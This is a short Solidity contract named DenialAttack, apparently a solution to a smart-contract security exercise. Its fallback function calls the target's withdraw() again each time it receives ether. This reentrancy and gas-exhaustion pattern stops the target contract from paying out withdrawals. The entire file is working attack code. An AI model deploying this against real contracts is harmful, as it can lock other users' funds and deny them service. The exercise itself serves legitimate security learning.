// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function withdraw() external;
}

contract DenialAttack {
    IDenial target;

    constructor(address _targetAddress) {
        target = IDenial(_targetAddress);
    }

    fallback() external payable {
        target.withdraw();
    }
}
